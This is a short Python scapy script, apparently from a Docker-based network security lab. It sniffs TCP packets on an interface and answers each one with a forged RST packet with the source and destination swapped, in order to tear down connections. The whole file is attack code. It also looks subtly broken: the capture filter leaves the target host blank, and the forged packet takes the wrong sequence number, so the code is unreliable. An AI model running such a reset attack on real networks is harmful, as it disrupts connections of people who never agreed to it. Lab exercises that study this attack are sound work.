#!usr/bin/env python3
from scapy.all import *
import subprocess

# The following two lines are used to automatically get the name of the interface used for docker
# If it does not work, you can simply set it manually
cmd = "ip a | grep 10.9.0.1 | awk '{print $7}'"
IFACE = subprocess.run(cmd, shell=True, check=True,
                       universal_newlines=True, stdout=subprocess.PIPE).stdout.strip()

def send_reset(pkt):
	"""
	Given a sniffed packet, send a rst packet with the correct information
	"""
	# pkt.show()

	src_ip = pkt[IP].src
	dst_ip = pkt[IP].dst
	src_port = pkt[TCP].sport
	dst_port = pkt[TCP].dport
	ack = pkt[TCP].ack
	seq = pkt[TCP].seq
	
	# tcp_seg_len = len(pkt.getlayer(Raw).load)

	ip = IP(src=dst_ip, dst=src_ip)
	tcp = TCP(sport=dst_port, dport=src_port, flags='R', seq=seq)

	rst = ip/tcp
	send(rst, verbose=0, iface=IFACE)

def main():
	# Sniffing exchanged packets
	print('[+] Sniffing...')
	pkt = sniff(iface=IFACE, filter='tcp and dst host ', prn=send_reset)

if __name__ == '__main__':
	main()
